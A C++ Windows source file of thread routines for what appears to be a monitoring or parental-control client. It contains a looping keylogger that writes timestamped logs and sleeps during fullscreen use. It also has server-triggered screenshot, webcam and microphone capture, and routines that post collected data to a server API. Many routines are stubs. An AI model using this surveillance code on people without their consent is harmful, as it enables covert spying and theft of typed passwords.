#include "taskRoutines.h"
#include <string>

DWORD WINAPI initFiltering(LPVOID lpParam)
{
	return 0;
}
DWORD WINAPI initKeylogger(LPVOID lpParam)
{
	while (1) {
		QUERY_USER_NOTIFICATION_STATE pquns;
		SHQueryUserNotificationState(&pquns);
		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN) // Determine a fullscreen state
		{
			// User in fullscreen mode
			// Go to sleep until its over 0_0
			Sleep(SYNC_TIME);
			continue;
		}
		// Get time and date
		time_t rawtime;
		struct tm* timeinfo;
		time(&rawtime);
		timeinfo = localtime(&rawtime);
		char dateString[80];
		wchar_t dateStringW[80];
		// Get the date as a string
		strftime(dateString, sizeof(dateString), "keylog.%d.%m.%Y.%H.%M.%S", timeinfo);
		// Cast the string to LPCWSTR
		mbstowcs(dateStringW, dateString, strlen(dateString) + 1);//Plus null
		LPCWSTR ptr = dateStringW;
		// Call the keylogger with current date as filename
		// Filename changes every { num_seconds } declared in the keylogger.cpp file 
		keylogger(dateStringW);
	}
	return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get screenshots request from server
		if (newRequest)
			screenCapture(0, 0, 1920, 1080, "screenshot.bmp");
		Sleep(SYNC_TIME);
	}
	return 0;
}
DWORD WINAPI initTimeLockdown(LPVOID lpParam)
{
	return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get camera request from server
		if (newRequest)
			camera();
		Sleep(SYNC_TIME);
	}
	return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
	while (1) {
		bool newRequest = false; // Get microphone request from server
		if (newRequest)
			recordAudio(10); // Record for 10 seconds
		Sleep(SYNC_TIME);
	}
	return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
	return 0;
}
DWORD WINAPI initRemoteCommands(LPVOID lpParam)
{
	return 0;
}
DWORD WINAPI sendItem(LPVOID lpParam, LPSTR itemType)
{
	LPSTR success = NULL;
	LPCWSTR deviceID = L"1aa46bc6-4f58-4027-9980-c82badac16c9"; // TODO : Get real device ID
	while (success == NULL) {
		Data newItem;
		newItem.dataType = itemType;
		newItem.dataAttributes = (char*)lpParam;
		char* myJson = (char*) jsonFromItem(&newItem, DATA);

		LPCWSTR additionalHeaders = L"Accept:application/json\r\nContent-Type:application/json\r\n\r\n";
		char* postData = myJson;

		std::wstring mywstring(deviceID);
		std::wstring concatted_stdstr = L"/data/add/" + mywstring;
		LPCWSTR apiUrl = concatted_stdstr.c_str();

		LPCWSTR method = L"POST";

		success = SendRequest(additionalHeaders, postData, apiUrl, method);
	}
	return 0;
}


DWORD WINAPI getItem(LPVOID lpParam, LPSTR itemType)
{
	LPSTR success = NULL;
	LPCWSTR deviceID = L"1aa46bc6-4f58-4027-9980-c82badac16c9"; // TODO : Get real device ID
	while (success == NULL) {

		LPCWSTR additionalHeaders = L"Accept:application/json\r\n\r\n";

		std::wstring mywstring(deviceID);
		std::wstring concatted_stdstr = L"/data/get/" + mywstring + L"/settings";
		LPCWSTR apiUrl = concatted_stdstr.c_str();

		LPCWSTR method = L"GET";

		success = SendRequest(additionalHeaders, NULL, apiUrl, method);
		// Save response to disk
	}
	return 0;
}